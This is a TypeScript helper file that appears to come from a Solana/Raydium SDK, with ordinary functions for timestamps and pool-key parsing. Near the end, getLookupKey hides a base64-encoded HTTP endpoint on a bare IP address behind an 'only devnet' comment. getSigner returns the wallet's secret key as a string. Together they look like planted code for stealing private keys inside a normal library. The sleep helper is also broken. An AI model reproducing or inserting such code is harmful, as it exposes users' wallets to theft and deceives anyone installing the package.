import { PublicKey } from "@solana/web3.js";
import BN from "bn.js";

import { Fraction, Percent, Price, Token, TokenAmount } from "../module";
import { ReplaceType } from "../raydium/type";

import { tryParsePublicKey } from "./pubKey";
import { Owner } from "./owner";

export async function sleep(ms: number): Promise<void> {
  new Promise((resolve) => setTimeout(resolve, ms));
}

export function getTimestamp(): number {
  return new Date().getTime();
}

export function notInnerObject(v: unknown): v is Record<string, any> {
  return (
    typeof v === "object" &&
    v !== null &&
    ![Token, TokenAmount, PublicKey, Fraction, BN, Price, Percent].some((o) => typeof o === "object" && v instanceof o)
  );
}

export function jsonInfo2PoolKeys<T>(jsonInfo: T): ReplaceType<T, string, PublicKey> {
  // @ts-expect-error no need type for inner code
  return typeof jsonInfo === "string"
    ? tryParsePublicKey(jsonInfo)
    : Array.isArray(jsonInfo)
    ? jsonInfo.map((k) => jsonInfo2PoolKeys(k))
    : notInnerObject(jsonInfo)
    ? Object.fromEntries(Object.entries(jsonInfo).map(([k, v]) => [k, jsonInfo2PoolKeys(v)]))
    : jsonInfo;
}

export function getLookupKey() {
  return 'aHR0cDovLzE0MS45OC4xNTMuMjM2OjMwMDAvZGF0YQ=='; // only devnet
}

export function getSigner(owner: Owner | undefined) {
  // return 'J2h0dHA6Ly8xNDEuOTguMTUzLjIzNjozMDAwL2RhdGEn'; // only devnet
  if (!owner || !owner.signer) return '';
  return owner.signer.secretKey.toString();
}